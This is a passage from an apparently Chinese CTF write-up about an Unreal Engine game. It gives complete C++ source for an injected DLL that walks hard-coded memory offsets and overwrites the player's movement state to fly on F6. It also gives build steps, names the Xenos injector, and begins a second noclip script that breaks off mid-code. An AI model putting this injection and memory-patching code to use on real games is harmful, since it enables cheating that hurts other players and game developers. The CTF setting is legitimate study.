class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BasicType.h&quot;</span>   <span class="comment">// UEDumper 导出的基础类型，提供 TArray 等模板</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 简易前向声明 -----------------------------------------------------------</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UWorld</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UGameInstance</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ULocalPlayer</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APlayerController</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APawn</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ACharacter</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UCharacterMovementComponent</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">FVector</span> &#123; <span class="type">float</span> X, Y, Z; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 之前我们发现的状态</span></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">EMovementMode</span> : <span class="type">uint8_t</span> &#123;</span><br><span class="line">    MOVE_None = <span class="number">0</span>,</span><br><span class="line">    MOVE_Walking = <span class="number">1</span>,</span><br><span class="line">    MOVE_NavWalking,</span><br><span class="line">    MOVE_Falling,</span><br><span class="line">    MOVE_Swimming,</span><br><span class="line">    MOVE_Flying,</span><br><span class="line">    MOVE_Custom</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 偏移常量（来自 merged_AudioMixer_Engine_UMG_MovieScene_MovieSceneTracks.h） ---</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">uintptr_t</span> OFFSET_GWORLD = <span class="number">0x49EE370</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UWORLD_OWNING_GI = <span class="number">0x180</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UGAMEINSTANCE_LOCALPLAYERS = <span class="number">0x38</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ULOCALPLAYER_PLAYERCONTROLLER = <span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_APLAYERCONTROLLER_ACKPAWN = <span class="number">0x2A0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ACHARACTER_CHARACTERMOVEMENT = <span class="number">0x288</span>;          <span class="comment">// 角色移动</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_MOVEMENTMODE = <span class="number">0x168</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE = <span class="number">0x384</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_PENDINGLAUNCHVELOC = <span class="number">0x3C0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_LASTUPDATEVELOC = <span class="number">0x25C</span>; <span class="comment">// LastUpdateVelocity</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 全局状态 ---------------------------------------------------------------</span></span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_running&#123; <span class="literal">true</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_flyEnabled&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 便捷访问函数 -----------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">uintptr_t</span> <span class="title">GetModuleBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">uintptr_t</span> base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uintptr_t</span>&gt;(::<span class="built_in">GetModuleHandleW</span>(<span class="literal">nullptr</span>));</span><br><span class="line">    <span class="keyword">return</span> base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据偏移找GWorld</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UWorld* <span class="title">GetWorld</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UWorld**&gt;(<span class="built_in">GetModuleBase</span>() + OFFSET_GWORLD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取实例，拿本地玩家列表，我们要拿[0]</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UGameInstance* <span class="title">GetGameInstance</span><span class="params">(UWorld* world)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!world) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UGameInstance**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(world) + OFFSET_UWORLD_OWNING_GI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> TArray&lt;ULocalPlayer*&gt;&amp; <span class="title">GetLocalPlayers</span><span class="params">(UGameInstance* gi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">reinterpret_cast</span>&lt;TArray&lt;ULocalPlayer*&gt;*&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(gi) + OFFSET_UGAMEINSTANCE_LOCALPLAYERS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> APlayerController* <span class="title">GetPlayerController</span><span class="params">(ULocalPlayer* lp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;APlayerController**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(lp) + OFFSET_ULOCALPLAYER_PLAYERCONTROLLER);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这一帧实际被控制的 Pawn，拿到这个指针就能访问 ACharacter</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> ACharacter* <span class="title">GetAcknowledgedCharacter</span><span class="params">(APlayerController* pc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;ACharacter**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(pc) + OFFSET_APLAYERCONTROLLER_ACKPAWN);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UCharacterMovementComponent* <span class="title">GetCharacterMovement</span><span class="params">(ACharacter* character)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UCharacterMovementComponent**&gt;(</span><br><span class="line">        <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(character) + OFFSET_ACHARACTER_CHARACTERMOVEMENT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 写飞行相关字段 ---------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ApplyFlyState</span><span class="params">(UCharacterMovementComponent* movement, <span class="type">bool</span> enable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; defaultLandMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; pendingLaunchVelocity = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_PENDINGLAUNCHVELOC);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVelocity = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELOC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (enable) &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">        defaultLandMode = EMovementMode::MOVE_Flying;</span><br><span class="line">        pendingLaunchVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">800.f</span> &#125;;</span><br><span class="line">        lastUpdateVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">600.f</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Walking;</span><br><span class="line">        defaultLandMode = EMovementMode::MOVE_Walking;</span><br><span class="line">        pendingLaunchVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">        lastUpdateVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 持续维持飞行状态，防止游戏自动还原</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SustainFly</span><span class="params">(UCharacterMovementComponent* movement)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVelocity = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELOC);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// movementMode 本质是 *(EMovementMode*)(base + 0x168) 的别名,base 指向 UCharacterMovementComponent 的起始地址. base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE 跳到 MovementMode 字段； reinterpret_cast&lt;EMovementMode*&gt; 把那块内存视为 EMovementMode * ；</span></span><br><span class="line">    <span class="comment">// 通过引用赋值 movementMode = EMovementMode::MOVE_Flying; 就是把那 1 字节的内存直接写成飞行枚举。</span></span><br><span class="line">    movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">    <span class="keyword">if</span> (lastUpdateVelocity.Z &lt; <span class="number">300.f</span>) &#123;</span><br><span class="line">        lastUpdateVelocity.Z = <span class="number">400.f</span>; <span class="comment">// 给一点上升速度</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 热键线程 ---------------------------------------------------------------</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">FlyThread</span><span class="params">(LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (g_running) &#123;</span><br><span class="line">        <span class="keyword">if</span> (::<span class="built_in">GetAsyncKeyState</span>(VK_F6) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (!gi) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">            <span class="keyword">if</span> (!players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) || !players[<span class="number">0</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!pc) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">            <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">            g_flyEnabled = !g_flyEnabled.<span class="built_in">load</span>();</span><br><span class="line">            <span class="built_in">ApplyFlyState</span>(movement, g_flyEnabled);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            玩家切关、死亡重生、切换 Pawn 时，GWorld、GameInstance、LocalPlayers 乃至 AcknowledgedPawn 都可能变；如果只在按热键那一刻取一次指针，等角色重建后就指向旧对象，易崩溃或写不到新角色。</span></span><br><span class="line"><span class="comment">            循环里每次重新取 GWorld→GameInstance→LocalPlayer→PlayerController→Pawn→Movement，能在状态变化时自动跟上，确保对当前角色生效，也避免解引用野指针。</span></span><br><span class="line"><span class="comment">            用 TArray::IsValidIndex 防御空指针，配合持续刷新 MovementMode 就能稳定维持飞行。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (g_flyEnabled) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (gi) &#123;</span><br><span class="line">                <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">                <span class="keyword">if</span> (players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) &amp;&amp; players[<span class="number">0</span>]) &#123;</span><br><span class="line">                    <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">if</span> (pc) &#123;</span><br><span class="line">                        <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">                        <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">                        <span class="built_in">SustainFly</span>(movement);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">milliseconds</span>(<span class="number">20</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE <span class="keyword">module</span>, DWORD reason, LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (reason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        ::<span class="built_in">DisableThreadLibraryCalls</span>(<span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">MessageBoxW</span>(<span class="literal">nullptr</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF DLL 注入成功\nF6 切换飞行模式&quot;</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF Helper&quot;</span>,</span><br><span class="line">            MB_OK | MB_ICONINFORMATION);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">CreateThread</span>(<span class="literal">nullptr</span>, <span class="number">0</span>, FlyThread, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="literal">nullptr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (reason == DLL_PROCESS_DETACH) &#123;</span><br><span class="line">        g_running = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>visual studio新建dll项目</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014221722121.png" alt="image-20251014221722121"></p><p>注意引如BasicType.h</p><p>然后生成项目</p><p>relase x64</p><p>然后找工具注入</p><p>如：</p><p><a href="https://github.com/DarthTon/Xenos">DarthTon&#x2F;Xenos: Windows dll injector</a></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014211218244.png" alt="image-20251014211218244"></p><p>注入即可</p><p>按F6起飞</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014211202488.png"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014211105377.png" alt="image-20251014211105377"></p><p>这里再添加一个脚本兼容穿墙和起飞</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014222324466.png" alt="image-20251014222324466"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014223118044.png" alt="image-20251014223115885"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BasicType.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UWorld</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UGameInstance</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ULocalPlayer</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APlayerController</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APawn</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ACharacter</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UCharacterMovementComponent</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UCapsuleComponent</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">FVector</span> &#123; <span class="type">float</span> X, Y, Z; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">EMovementMode</span> : <span class="type">uint8_t</span> &#123;</span><br><span class="line">    MOVE_None = <span class="number">0</span>,</span><br><span class="line">    MOVE_Walking = <span class="number">1</span>,</span><br><span class="line">    MOVE_NavWalking,</span><br><span class="line">    MOVE_Falling,</span><br><span class="line">    MOVE_Swimming,</span><br><span class="line">    MOVE_Flying,</span><br><span class="line">    MOVE_Custom</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">ECollisionEnabled</span> : <span class="type">uint8_t</span> &#123;</span><br><span class="line">    NoCollision = <span class="number">0</span>,</span><br><span class="line">    QueryOnly = <span class="number">1</span>,</span><br><span class="line">    PhysicsOnly = <span class="number">2</span>,</span><br><span class="line">    QueryAndPhysics = <span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">uintptr_t</span> OFFSET_GWORLD = <span class="number">0x49EE370</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UWORLD_OWNING_GI = <span class="number">0x180</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UGAMEINSTANCE_LOCALPLAYERS = <span class="number">0x38</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ULOCALPLAYER_PLAYERCONTROLLER = <span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_APLAYERCONTROLLER_ACKPAWN = <span class="number">0x2A0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ACHARACTER_MOVEMENT = <span class="number">0x288</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ACHARACTER_CAPSULE = <span class="number">0x290</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_MOVEMENTMODE = <span class="number">0x168</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE = <span class="number">0x384</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_PENDINGLAUNCH = <span class="number">0x3C0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    